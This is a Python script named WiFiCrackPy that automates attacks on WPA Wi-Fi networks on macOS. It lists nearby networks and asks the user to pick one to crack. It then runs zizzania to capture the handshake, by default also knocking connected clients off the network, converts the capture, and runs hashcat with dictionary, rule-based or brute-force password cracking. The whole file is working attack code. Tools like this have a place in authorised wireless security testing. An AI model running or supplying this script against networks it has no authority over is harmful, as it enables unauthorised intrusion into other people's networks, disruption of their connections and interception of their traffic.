import subprocess
import argparse
import re
from prettytable import PrettyTable
from tabulate import tabulate
from os.path import expanduser
from pyfiglet import Figlet

airport = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport'

parser = argparse.ArgumentParser()
parser.add_argument('-w')
parser.add_argument('-m')
parser.add_argument('-i')
parser.add_argument('-p')
parser.add_argument('-d', action='store_false')
parser.add_argument('-o', action='store_true')
parser.add_argument('-r')
args = parser.parse_args()


def scan_networks():
    print('Scanning for networks...\n')

    scan = subprocess.run(['sudo', airport, '-s'], stdout=subprocess.PIPE)
    scan = scan.stdout.decode('utf-8').split('\n')
    count = len(scan) - 1
    scan = [o.split() for o in scan]

    list = PrettyTable(['Number', 'Name', 'BSSID', 'RSSI', 'Channel', 'Security'])
    networks = {}
    for i in range(1, count):
        bssid = re.search('([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})', ' '.join(scan[i])).group(0)
        bindex = scan[i].index(bssid)

        network = {}
        network['ssid'] = ' '.join(scan[i][0:bindex])
        network['bssid'] = bssid
        network['rssi'] = scan[i][bindex + 1]
        network['channel'] = scan[i][bindex + 2].split(',')[0]
        network['security'] = scan[i][bindex + 5].split('(')[0]

        networks[i] = network
        list.add_row([i, network['ssid'], network['bssid'], network['rssi'], network['channel'], network['security']])

    print(list)

    x = input('\nSelect a network to crack - (or press r to refresh): ')
    if x == 'r':
        scan_networks()
    else:
        x = int(x)
    capture_network(networks[x]['bssid'], networks[x]['ssid'], networks[x]['channel'])


def capture_network(bssid, ssid, channel):
    subprocess.run(['sudo', airport, '-z'])
    subprocess.run(['sudo', airport, '-c' + channel])

    if args.i is None:
        iface = subprocess.run(['networksetup', '-listallhardwareports'], stdout=subprocess.PIPE)
        iface = iface.stdout.decode('utf-8').split('\n')
        iface = iface[iface.index('Hardware Port: Wi-Fi') + 1].split(': ')[1]
    else:
        iface = args.i

    print('\nInitiating zizzania to capture handshake...\n')

    subprocess.run(['sudo', expanduser('~') + '/zizzania/src/zizzania', '-i', iface, '-b', bssid, '-w', str(ssid)+'.pcap', '-q'] + ['-n'] * args.d)

    subprocess.run(['hcxpcapngtool', '-o', str(ssid)+'.hc22000', str(ssid)+'.pcap'], stdout=subprocess.PIPE)

    print('\nHandshake ready for cracking...\n')

    crack_capture(ssid)


def crack_capture(ssid):
    if args.m is None:
        print(tabulate([[1, 'Dictionary'], [2, 'Brute-force'], [3, 'Manual']], headers=['Number', 'Mode']))
        method = int(input('\nSelect an attack mode: '))
    else:
        method = int(args.m)

    if method == 1 and args.w is None:
        wordlist = input('\nInput a wordlist path: ')
    elif method == 1 and args.w is not None:
        wordlist = args.w

    if method == 1 and (args.r is None):
        subprocess.run(['sudo','hashcat', '-m', '22000', str(ssid)+'.hc22000', wordlist] + ['-O'] * args.o)
    elif method == 1 and (args.r is not None):
        rule = args.r
        subprocess.run(['sudo','hashcat', '-m', '22000', str(ssid)+'.hc22000','-r', str(rule), wordlist] + ['-O'] * args.o)
    elif method == 2:
        if args.p is None:
            pattern = input('\nInput a brute-force pattern: ')
        else:
            pattern = args.p
        subprocess.run(['sudo','hashcat', '-m', '22000', '-a', '3', str(ssid)+'.hc22000', pattern] + ['-O'] * args.o)
    else:
        print('\nRun hashcat against: '+str(ssid)+'.hc22000')


f = Figlet(font='big')
print('\n' + f.renderText('WiFiCrackPy'))

scan_networks()
